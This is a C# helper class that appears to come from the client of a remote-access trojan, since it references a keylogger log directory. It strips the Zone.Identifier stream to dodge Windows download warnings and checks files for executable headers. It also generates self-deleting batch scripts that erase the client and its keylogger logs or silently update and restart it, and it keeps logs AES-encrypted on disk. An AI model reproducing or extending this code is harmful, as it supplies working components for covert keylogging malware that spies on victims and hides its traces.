using System;
using System.IO;
using System.Text;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Utilities;

namespace xClient.Core.Helper;

public static class FileHelper
{
	private const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	private static readonly Random _rnd = new Random(Environment.TickCount);

	public static string GetRandomFilename(int length, string extension = "")
	{
		StringBuilder stringBuilder = new StringBuilder(length);
		for (int i = 0; i < length; i++)
		{
			stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[_rnd.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
		}
		return stringBuilder.ToString() + extension;
	}

	public static string GetTempFilePath(string extension)
	{
		string text;
		do
		{
			text = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
		}
		while (File.Exists(text));
		return text;
	}

	public static bool IsValidExecuteableFile(byte[] block)
	{
		if (block.Length < 2)
		{
			return false;
		}
		if (block[0] == 77 && block[1] == 90)
		{
			return true;
		}
		if (block[0] == 90)
		{
			return block[1] == 77;
		}
		return false;
	}

	public static bool DeleteZoneIdentifier(string filePath)
	{
		return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
	}

	public static string CreateUninstallBatch(bool isFileHidden)
	{
		try
		{
			string tempFilePath = GetTempFilePath(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + ClientData.CurrentPath + "\"\r\nrmdir /q /s \"" + Keylogger.LogDirectory + "\"\r\ndel /a /q /f \"" + tempFilePath + "\"";
			File.WriteAllText(tempFilePath, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return tempFilePath;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string CreateUpdateBatch(string newFilePath, bool isFileHidden)
	{
		try
		{
			string tempFilePath = GetTempFilePath(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + ClientData.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + ClientData.CurrentPath + "\"\r\nstart \"\" \"" + ClientData.CurrentPath + "\"\r\ndel /a /q /f \"" + tempFilePath + "\"";
			File.WriteAllText(tempFilePath, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return tempFilePath;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static string CreateRestartBatch()
	{
		try
		{
			string tempFilePath = GetTempFilePath(".bat");
			string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + ClientData.CurrentPath + "\"\r\ndel /a /q /f \"" + tempFilePath + "\"";
			File.WriteAllText(tempFilePath, contents, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
			return tempFilePath;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	public static void WriteLogFile(string filename, string appendText)
	{
		appendText = ReadLogFile(filename) + appendText;
		using FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write);
		byte[] array = AES.Encrypt(Encoding.UTF8.GetBytes(appendText));
		fileStream.Seek(0L, SeekOrigin.Begin);
		fileStream.Write(array, 0, array.Length);
	}

	public static string ReadLogFile(string filename)
	{
		if (!File.Exists(filename))
		{
			return string.Empty;
		}
		return Encoding.UTF8.GetString(AES.Decrypt(File.ReadAllBytes(filename)));
	}
}
